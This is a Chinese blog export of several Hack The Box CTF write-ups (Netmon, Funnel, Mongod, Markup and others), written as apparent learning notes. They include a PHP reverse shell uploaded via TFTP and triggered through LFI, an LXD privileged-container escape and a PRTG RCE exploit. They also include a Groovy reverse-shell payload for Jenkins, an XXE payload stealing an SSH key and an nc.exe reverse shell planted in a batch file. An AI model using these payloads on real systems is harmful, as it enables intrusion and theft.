<h5 id="四、哪个有趣的文件位于Web服务器文件夹中，可用于横向移动？"><a href="#四、哪个有趣的文件位于Web服务器文件夹中，可用于横向移动？" class="headerlink" title="四、哪个有趣的文件位于Web服务器文件夹中，可用于横向移动？"></a>四、哪个有趣的文件位于Web服务器文件夹中，可用于横向移动？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用gobuster扫目录</span></span><br><span class="line">gobuster dir -u http://IP -w /usr/share/dirb/wordlists/comment.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问http://IP/file=.htpasswd</span></span><br><span class="line">.htpasswd</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/tGef6NSWsaHTLjU.png" alt="image-20230316142611449"></p>
<p><img src="https://s2.loli.net/2023/03/23/XqStcCxY2l6yLMb.png" alt="image-20230316142715454"></p>
<h5 id="五、用户-Mike-所属并可被利用进行权限提升的组是什么？"><a href="#五、用户-Mike-所属并可被利用进行权限提升的组是什么？" class="headerlink" title="五、用户 Mike 所属并可被利用进行权限提升的组是什么？"></a>五、用户 Mike 所属并可被利用进行权限提升的组是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">利用tftp上传PHPshell到靶机</span></span><br><span class="line">tftp 靶机IP</span><br><span class="line">put /usr/share/webshells/php-reverse-shell.php</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在web中访问shell，shell在tftp默认存储目录</span></span><br><span class="line">http://IP/?file=/var/lib/tftpboot/php-reverse-shell.php</span><br><span class="line">ncat -lvnp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提升为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到mike用户</span></span><br><span class="line">su mike </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看mike所属组</span></span><br><span class="line">groups</span><br><span class="line">lxd</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/VKWvHiQeZUPwymG.png" alt="image-20230316151353533"></p>
<p><img src="https://s2.loli.net/2023/03/23/VSFckHOawsKTzqC.png" alt="image-20230316151808865"></p>
<p><img src="https://s2.loli.net/2023/03/23/EtlqLRcjO5AGWrT.png" alt="image-20230316152017468"></p>
<h6 id="六、当使用映像通过容器利用系统时，我们寻找一个非常小的发行版。我们最喜欢这项任务以山脉命名。该发行版名称是什么？"><a href="#六、当使用映像通过容器利用系统时，我们寻找一个非常小的发行版。我们最喜欢这项任务以山脉命名。该发行版名称是什么？" class="headerlink" title="六、当使用映像通过容器利用系统时，我们寻找一个非常小的发行版。我们最喜欢这项任务以山脉命名。该发行版名称是什么？"></a>六、当使用映像通过容器利用系统时，我们寻找一个非常小的发行版。我们最喜欢这项任务以山脉命名。该发行版名称是什么？</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#google搜索提示内容</span><br><span class="line">Alpine</span><br></pre></td></tr></table></figure>

<h5 id="七、我们为容器设置什么标志，以便它在主机系统上具有-root-权限？"><a href="#七、我们为容器设置什么标志，以便它在主机系统上具有-root-权限？" class="headerlink" title="七、我们为容器设置什么标志，以便它在主机系统上具有 root 权限？"></a>七、我们为容器设置什么标志，以便它在主机系统上具有 root 权限？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">security.privileged=true</span><br></pre></td></tr></table></figure>

<h5 id="八、如果根文件系统挂载在容器中的-x2F-mnt-处，那么挂载主机系统后，在容器上的什么位置可以找到根标志？"><a href="#八、如果根文件系统挂载在容器中的-x2F-mnt-处，那么挂载主机系统后，在容器上的什么位置可以找到根标志？" class="headerlink" title="八、如果根文件系统挂载在容器中的 &#x2F;mnt 处，那么挂载主机系统后，在容器上的什么位置可以找到根标志？"></a>八、如果根文件系统挂载在容器中的 &#x2F;mnt 处，那么挂载主机系统后，在容器上的什么位置可以找到根标志？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载利用工具</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译工具</span></span><br><span class="line">sudo ./build-alpine</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启python的web服务</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在靶机中下载编译完成的tar包</span></span><br><span class="line">wget http://10.10.14.35/alpine-v3.17-x86_64-20230316_0437.tar.gz</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用lxc以镜像的方式导入tar包</span></span><br><span class="line">lxc image import ./alpine-v3.17-x86_64-20230316_0437.tar.gz --alias myimages</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看image列表</span></span><br><span class="line">lxc image list</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置容器标志，给予root权限</span></span><br><span class="line">lxc init myimages ignite -c security.privileged=true</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将宿主机的/mnt/root/挂载到容器下</span></span><br><span class="line">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动容器</span></span><br><span class="line">lxc start ignite</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行shell</span></span><br><span class="line">lxc exec ignite /bin/sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看<span class="built_in">id</span></span></span><br><span class="line">id</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">寻找root.txt</span></span><br><span class="line">find / type f -name root.txt 2&gt;/dev/null</span><br><span class="line">/mnt/root/</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/RBUekMQ18cW2fSx.png" alt="image-20230316164913391"></p>
<p><img src="https://s2.loli.net/2023/03/23/IKmvpJwsOn8GSzP.png" alt="image-20230316164926341"></p>
<p><img src="https://s2.loli.net/2023/03/23/5Em9d72lPqIr4vp.png" alt="image-20230316165603164"></p>
<p><img src="https://s2.loli.net/2023/03/23/jEC6xOtnHfJyv3a.png" alt="image-20230316165545517"></p>
<p><img src="https://s2.loli.net/2023/03/23/YlAvjSrTEMZ6pBJ.png" alt="image-20230316170058117"></p>
<p><img src="https://s2.loli.net/2023/03/23/LzsWPcDBSq8hAFu.png" alt="image-20230316171244257"></p>
<p><img src="https://s2.loli.net/2023/03/23/NGojQcY71wU8IOi.png" alt="image-20230316171653225"></p>
<h5 id="九、提交user"><a href="#九、提交user" class="headerlink" title="九、提交user"></a>九、提交user</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件路径为/mnt/root/home/mike/user.txt</span></span><br><span class="line">cat /mnt/root/home/mike/user.txt</span><br><span class="line">a56ef91d70cfbf2cdb8f454c006935a1</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/F1XD2a6PZlrumLx.png" alt="image-20230316172142314"></p>
<h5 id="十、提交root"><a href="#十、提交root" class="headerlink" title="十、提交root"></a>十、提交root</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件路径为/mnt/root/root/root.txt</span></span><br><span class="line">cat /mnt/root/root/root.txt</span><br><span class="line">c693d9c7499d9f572ee375d4c14c7bcf</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/F1XD2a6PZlrumLx.png" alt="image-20230316172142314"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li>LXD提权过程</li>
<li>本地文件读取漏洞的利用</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Netmon</title>
    <url>/2023/07/06/HTB-Netmon/</url>
    <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>使用nmap对靶机IP进行扫描，目标开放21，80，135，139，445，操作系统为Windows Server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC 10.129.248.153</span><br></pre></td></tr></table></figure>

<h5 id="端口测试"><a href="#端口测试" class="headerlink" title="端口测试"></a>端口测试</h5><ul>
<li><p>21端口存在FTP弱密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">连接FTP，用户名Anonymous</span></span><br><span class="line">ftp 10.129.248.153</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在/Users/Public/目录下找到user.txt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用get下载到本地</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/28/MqJwsyR1nciNTVG.png" alt="image-20230327150737710"></p>
</li>
<li><p>访问80端口，应用显示PRTG Network Monitor (NETMON)，搜索PRTG漏洞</p>
<ul>
<li><p>应用存在RCE漏洞，exp地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/shk0x/PRTG-Network-Monitor-RCE</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用方法</p>
<ul>
<li><p>使用git clone下载exp</p>
</li>
<li><p>切换到EXP目录中，chmod +x install.sh</p>
</li>
<li><p>执行sh文件，生成pentest用户并添加到管理员组中，密码为P3nT3st!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cookie由Burp抓包获取</span><br><span class="line">./prtg-exploit.sh -u http://10.129.123.65 -c &quot;Cookie;_gat=1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/28/QpJxnqtT76D3KXL.png" alt="image-20230327170115160"></p>
<p><img src="https://s2.loli.net/2023/03/28/h4oLztqMZCPSp6X.png" alt="image-20230327170135796"></p>
</li>
</ul>
</li>
<li><p>使用impacket-psexec连接靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec pentest@10.129.123.65</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/28/h3UkMLgCifpX4yG.png" alt="image-20230327170251998"></p>
</li>
<li><p>在C:\Users\Administrator\Desktop目录下找到root.txt</p>
<p><img src="https://s2.loli.net/2023/03/28/QnMieS2Z4V1bhXq.png" alt="image-20230327170355592"></p>
</li>
<li><p>使用type命令查看root.txt</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Funnel</title>
    <url>/2023/07/06/HTB-PennyWorth/</url>
    <content><![CDATA[<h5 id="一、首字母缩略词-CVE-代表什么？"><a href="#一、首字母缩略词-CVE-代表什么？" class="headerlink" title="一、首字母缩略词 CVE 代表什么？"></a>一、首字母缩略词 CVE 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Common Vulnerabilities and Exposures</span><br></pre></td></tr></table></figure>

<h5 id="二、在网络安全中，CIA指的是什么？"><a href="#二、在网络安全中，CIA指的是什么？" class="headerlink" title="二、在网络安全中，CIA指的是什么？"></a>二、在网络安全中，CIA指的是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#信息安全三要素，机密性，完整性，可用性</span><br><span class="line">Confidentiality, Integrity, Availability</span><br></pre></td></tr></table></figure>

<h5 id="三、端口-8080-上运行的服务版本是什么？"><a href="#三、端口-8080-上运行的服务版本是什么？" class="headerlink" title="三、端口 8080 上运行的服务版本是什么？"></a>三、端口 8080 上运行的服务版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描IP</span></span><br><span class="line">nmap -sC -sV IP</span><br><span class="line">Jetty 9.4.39.v20210325</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/43XgzIN5pmVcS6y.png" alt="image-20230314154438068"></p>
<h5 id="四、目标上运行的是哪个版本的-Jenkins？"><a href="#四、目标上运行的是哪个版本的-Jenkins？" class="headerlink" title="四、目标上运行的是哪个版本的 Jenkins？"></a>四、目标上运行的是哪个版本的 Jenkins？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl命令或者目录爆破</span></span><br><span class="line">curl -v http://ip:port</span><br><span class="line">2.289.1</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/14/YhOJpnQGUvFPVXa.png" alt="image-20230314154831206"></p>
<h5 id="五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？"><a href="#五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？" class="headerlink" title="五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？"></a>五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Groovy是一种基于Java平台的面向对象语言。</span><br><span class="line">groovy</span><br></pre></td></tr></table></figure>

<h5 id="六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？"><a href="#六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？" class="headerlink" title="六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？"></a>六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd.exe</span><br></pre></td></tr></table></figure>

<h5 id="七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？"><a href="#七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？" class="headerlink" title="七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？"></a>七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<h5 id="八、哪个开关可以让我们在netcat-上使用UDP传输模式？"><a href="#八、哪个开关可以让我们在netcat-上使用UDP传输模式？" class="headerlink" title="八、哪个开关可以让我们在netcat 上使用UDP传输模式？"></a>八、哪个开关可以让我们在netcat 上使用UDP传输模式？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u</span><br></pre></td></tr></table></figure>

<h5 id="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"><a href="#九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？" class="headerlink" title="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"></a>九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse shell</span><br></pre></td></tr></table></figure>

<h5 id="十、提交root-flag"><a href="#十、提交root-flag" class="headerlink" title="十、提交root flag"></a>十、提交root flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行用户名，密码爆破</span></span><br><span class="line">root，password</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在manage-script-console中写入payload</span></span><br><span class="line">String host=&quot;IP&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">升级为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/iEfu9mUoxzKHC8O.png" alt="image-20230314170911498"></p>
<p><img src="https://s2.loli.net/2023/03/23/heHuyG9Vbf8dacm.png" alt="image-20230314224013599"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Mongod</title>
    <url>/2023/07/06/HTB-Mongod/</url>
    <content><![CDATA[<h5 id="一、计算机上打开了多少个-TCP-端口？"><a href="#一、计算机上打开了多少个-TCP-端口？" class="headerlink" title="一、计算机上打开了多少个 TCP 端口？"></a>一、计算机上打开了多少个 TCP 端口？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap进行扫描</span></span><br><span class="line">nmap -sV IP</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h5 id="二、远程主机的端口-27017-上运行哪个服务？"><a href="#二、远程主机的端口-27017-上运行哪个服务？" class="headerlink" title="二、远程主机的端口 27017 上运行哪个服务？"></a>二、远程主机的端口 27017 上运行哪个服务？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用nmap扫描指定端口27017</span></span><br><span class="line">nmap -sV -p 27017 IP</span><br></pre></td></tr></table></figure>

<h5 id="三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）"><a href="#三、MongoDB是什么类型的数据库？（选择：SQL-或-NoSQL）" class="headerlink" title="三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）"></a>三、MongoDB是什么类型的数据库？（选择：SQL 或 NoSQL）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NoSQL</span><br></pre></td></tr></table></figure>

<h5 id="五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？"><a href="#五、与-mongodb-clients-软件包一起安装的-Mongo-shell-的命令名称是什么？" class="headerlink" title="五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？"></a>五、与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure>

<h5 id="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随"><a href="#六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随" class="headerlink" title="六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)"></a>六、用于列出MongoDB服务器上存在的所有数据库的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>

<h5 id="七、用于列出数据库中集合的命令是什么？（无需包含尾随"><a href="#七、用于列出数据库中集合的命令是什么？（无需包含尾随" class="headerlink" title="七、用于列出数据库中集合的命令是什么？（无需包含尾随;)"></a>七、用于列出数据库中集合的命令是什么？（无需包含尾随;)</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>

<h5 id="八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？"><a href="#八、用于以易于阅读的格式转储名为-flag-的集合中所有文档的内容的命令是什么？" class="headerlink" title="八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？"></a>八、用于以易于阅读的格式转储名为 flag 的集合中所有文档的内容的命令是什么？</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#链接mongoDB</span><br><span class="line">mongo IP</span><br><span class="line">#切换到sensitive_information数据库</span><br><span class="line">use sensitive_information</span><br><span class="line">#列出数据库中的集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#列出flag集合的内容</span><br><span class="line">db.flag.find().pretty()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/11/VQaAGWXT8FbNLCZ.png" alt="image-20230309233854675"></p>
<h5 id="九、提交flag"><a href="#九、提交flag" class="headerlink" title="九、提交flag"></a>九、提交flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1b6e6fb359e7c40241b6d431427ba6ea</span><br></pre></td></tr></table></figure>

<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>MongoDB数据库的操作指令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#列出所有数据库</span><br><span class="line"><span class="keyword">show</span> dbs</span><br><span class="line">#使用特定数据库</span><br><span class="line">use DBName</span><br><span class="line">#列出所有集合</span><br><span class="line"><span class="keyword">show</span> collections</span><br><span class="line">#展示集合中的数据</span><br><span class="line">db.COLname.find().pretty</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Markup</title>
    <url>/2023/07/06/HTB-Markup/</url>
    <content><![CDATA[<h5 id="一、目标端口-80-上运行的是什么版本的-Apache？"><a href="#一、目标端口-80-上运行的是什么版本的-Apache？" class="headerlink" title="一、目标端口 80 上运行的是什么版本的 Apache？"></a>一、目标端口 80 上运行的是什么版本的 Apache？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用nmap扫描IP</span><br><span class="line">nmap -sC -sV IP</span><br><span class="line">2.4.41</span><br></pre></td></tr></table></figure>

<h5 id="二、什么用户名：密码组合登录成功？"><a href="#二、什么用户名：密码组合登录成功？" class="headerlink" title="二、什么用户名：密码组合登录成功？"></a>二、什么用户名：密码组合登录成功？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用burp抓包进行爆破</span><br><span class="line">admin:password</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/zMYSId8j1UZxyrN.png" alt="image-20230317152339788"></p>
<p><img src="https://s2.loli.net/2023/03/23/lgeZQ3v5yMzF6nI.png" alt="image-20230317152410387"></p>
<h5 id="三、页面顶部接受用户输入的单词是什么？"><a href="#三、页面顶部接受用户输入的单词是什么？" class="headerlink" title="三、页面顶部接受用户输入的单词是什么？"></a>三、页面顶部接受用户输入的单词是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/2DYs6ln9vZSUVKL.png" alt="image-20230317152537907"></p>
<h5 id="四、目标上使用的-XML-版本是什么？"><a href="#四、目标上使用的-XML-版本是什么？" class="headerlink" title="四、目标上使用的 XML 版本是什么？"></a>四、目标上使用的 XML 版本是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用burp抓包</span><br><span class="line">1.0</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/XTEnhvGSJbu5fNL.png" alt="image-20230317152704149"></p>
<h5 id="五、XXE-x2F-XEE攻击首字母缩略词代表什么？"><a href="#五、XXE-x2F-XEE攻击首字母缩略词代表什么？" class="headerlink" title="五、XXE &#x2F; XEE攻击首字母缩略词代表什么？"></a>五、XXE &#x2F; XEE攻击首字母缩略词代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XML External Entity</span><br></pre></td></tr></table></figure>

<h5 id="六、我们可以在网页的-HTML-代码中找到什么用户名？"><a href="#六、我们可以在网页的-HTML-代码中找到什么用户名？" class="headerlink" title="六、我们可以在网页的 HTML 代码中找到什么用户名？"></a>六、我们可以在网页的 HTML 代码中找到什么用户名？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用burp抓包</span><br><span class="line">Daniel</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/sUtrXkMFw6Dvh1P.png" alt="image-20230317161628037"></p>
<h5 id="七、目标上的Log-Management文件夹中的文件是什么？"><a href="#七、目标上的Log-Management文件夹中的文件是什么？" class="headerlink" title="七、目标上的Log-Management文件夹中的文件是什么？"></a>七、目标上的Log-Management文件夹中的文件是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">尝试用XXE漏洞读取Daniel用户的ssh私钥文件（注意后缀，一定是私钥）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Payload</span></span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Users/Daniel/.ssh/id_rsa&quot; &gt; ]&gt;</span><br><span class="line">&lt;order&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;1111&lt;/address&gt;&lt;/order&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用ssh -i连接</span></span><br><span class="line">ssh -i ./isa Daniel@IP</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在C盘上找到Log-Management</span></span><br><span class="line">job.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/IiYt64UFh9OPgWB.png" alt="image-20230320155059527"></p>
<p><img src="https://s2.loli.net/2023/03/23/6LKS1uwoE3DPlWb.png" alt="image-20230320170543465"></p>
<h5 id="八、前面提到的job-bat文件中提到了什么可执行文件？"><a href="#八、前面提到的job-bat文件中提到了什么可执行文件？" class="headerlink" title="八、前面提到的job.bat文件中提到了什么可执行文件？"></a>八、前面提到的job.bat文件中提到了什么可执行文件？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用type查看job.bat文件内容</span><br><span class="line">type job.bat</span><br><span class="line">wevtutil.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/rm4yBWCOZaxXbp3.png" alt="image-20230320170708899"></p>
<h5 id="九、提交userflag"><a href="#九、提交userflag" class="headerlink" title="九、提交userflag"></a>九、提交userflag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">user.txt在daniel的桌面上，可以使用<span class="keyword">for</span>命令进行查找</span></span><br><span class="line">for /r C: %i in (user.*) do echo %i</span><br><span class="line">type C:\Users\daniel\Desktop\user.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/l8MFJuy3ETx2YUd.png" alt="image-20230320171641331"></p>
<h5 id="十、提交rootflag"><a href="#十、提交rootflag" class="headerlink" title="十、提交rootflag"></a>十、提交rootflag</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换到powershell查看job.bat文件的权限，显示所有用户都可以修改文件</span></span><br><span class="line"><span class="built_in">get-acl</span> job.bat | <span class="built_in">fl</span></span><br><span class="line"><span class="comment">#使用powershell下载nc到本地</span></span><br><span class="line">Powershell <span class="literal">-c</span> <span class="string">&quot;IWR -useBasicParsing http://10.10.14.19/nc64.exe -o nc.exe&quot;</span></span><br><span class="line"><span class="comment">#将nc命令写入job.bat（不要在powershell下运行，会报错）</span></span><br><span class="line"><span class="built_in">echo</span> C:\Users\Daniel\Desktop\nc.exe <span class="literal">-e</span> cmd.exe <span class="number">10.10</span>.<span class="number">14.19</span> <span class="number">4444</span>&gt; C:\Log<span class="literal">-Management</span>\job.bat</span><br><span class="line"><span class="comment">#切换到C盘，使用for命令查找root.txt</span></span><br><span class="line"><span class="keyword">for</span> /<span class="built_in">r</span> %i <span class="keyword">in</span> (root.*) <span class="keyword">do</span> <span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/03/23/uH9WNgETt82AvlY.png" alt="image-20230320171847725"></p>
<p><img src="https://s2.loli.net/2023/03/23/F6OyjsH9qVScaek.png" alt="image-20230321102736275"></p>
<p><img src="https://s2.loli.net/2023/03/23/phHTMK6ylNExIV5.png" alt="image-20230321102801026"></p>
<p><img src="https://s2.loli.net/2023/03/23/HgAYGklctJj5yDM.png" alt="image-20230321103305525"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Pilgrimage</title>
    <url>/2023/07/06/HTB-Pilgrimage/</url>
    <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
<li><p>端口扫描，熟悉的80，22端口开局</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rustscan -a 10.129.160.210 -r 0-65535 --ulimit 5000</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/07/06/mjNrOvIY53lKgka.png" alt="image-20230630101727144"></p>
</li>
<li><p>访问80端口，需要修改hosts文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br><span class="line">//修改内容</span><br><span class="line">10.129.160.210   pilgrimage.htb</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h5><ul>
